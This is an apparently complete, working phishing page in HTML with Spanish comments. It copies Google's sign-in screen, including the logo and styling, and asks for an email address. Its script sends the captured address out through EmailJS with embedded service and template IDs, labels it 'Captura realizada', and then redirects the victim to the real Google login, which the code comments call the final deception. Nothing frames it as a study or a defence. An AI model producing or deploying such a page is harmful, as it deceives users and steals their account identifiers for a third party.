<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuentas de Google</title>
    <style>
        body {
            background-color: #f2f2f2;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: white;
            width: 450px;
            padding: 48px 40px 30px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            text-align: center;
        }

        .logo {
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .logo img {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px 0;
            color: #202124;
        }

        p.subtitle {
            color: #202124;
            font-size: 16px;
            margin-bottom: 35px;
        }

        .input-group {
            position: relative;
            margin-bottom: 40px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
        }

        .input-group input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Ajuste por el borde más grueso */
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #5f6368;
            margin-bottom: 5px;
        }

        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 13px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }

        .btn-next:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }

        .footer {
            margin-top: 50px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 10px;
        }

        /* Spinner de carga (oculto por defecto) */
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo de Google -->
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.54h13.94c-.58 2.92-2.05 5.38-4.5 7.06l7.27 5.65c5.04-4.65 8.92-11.5 8.92-19.68z"/>
                <path fill="#FBBC05" d="M11.54 28.37c-.78-2.3-1.22-4.73-1.22-7.37s.44-5.07 1.22-7.37L3.56 10.73C1.43 14.97 0 19.66 0 24s1.43 9.03 3.56 13.27l7.98-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.95-2.13 15.87-5.76l-7.27-5.65c-3.44 2.31-7.86 3.67-12.6 3.67-6.26 0-11.57-4.22-13.43-9.93l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
        </div>

        <h1>Iniciar sesión</h1>
        <p class="subtitle">Usa tu cuenta de Google para unirte a <strong>Aplicación X</strong></p> <!-- Cambia "Aplicación X" por algo genérico -->

        <form id="loginForm">
            <div class="input-group">
                <label for="email">Correo electrónico o teléfono</label>
                <input type="email" id="email" name="email" required autocomplete="off">
            </div>

            <div class="loader" id="loader"></div>
            
            <div style="overflow: hidden;">
                <button type="submit" class="btn-next" id="btnNext">Siguiente</button>
            </div>
        </form>
        
        <div style="clear: both;"></div>
        
        <div style="text-align: left; margin-top: 15px;">
            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none;">¿Has olvidado tu correo electrónico?</a>
        </div>

        <div class="footer">
            <a href="#">Ayuda</a>
            <a href="#">Privacidad</a>
            <a href="#">Términos</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Inicializa EmailJS
        (function() {
            emailjs.init("q1IUmbgdFeBvmxnvi"); 
        })();

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const btn = document.getElementById('btnNext');
            const loader = document.getElementById('loader');
            const formElements = document.querySelectorAll('label, input, .subtitle, a');

            // 1. Efecto de carga
            btn.style.display = 'none';
            loader.style.display = 'block';
            
            // Ocultar elementos del formulario para que parezca que "se va"
            formElements.forEach(el => el.style.opacity = '0.5');

            // 2. Simular espera de 2 segundos (como Google)
            setTimeout(() => {
                // 3. Enviar datos
                const templateParams = {
                    from_email: email,
                    message: "Captura realizada"
                };

                emailjs.send('service_rkpt26i', 'template_zl3ywbm', templateParams)
                    .then(function() {
                        // 4. Redirigir a Google para el engaño final
                        window.location.href = "https://accounts.google.com/signin/v2/identifier?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F";
                    }, function(error) {
                        console.error('Error:', error);
                        alert("Error de conexión");
                        loader.style.display = 'none';
                        btn.style.display = 'block';
                    });
            }, 2000);
        });
    </script>
</body>
</html>
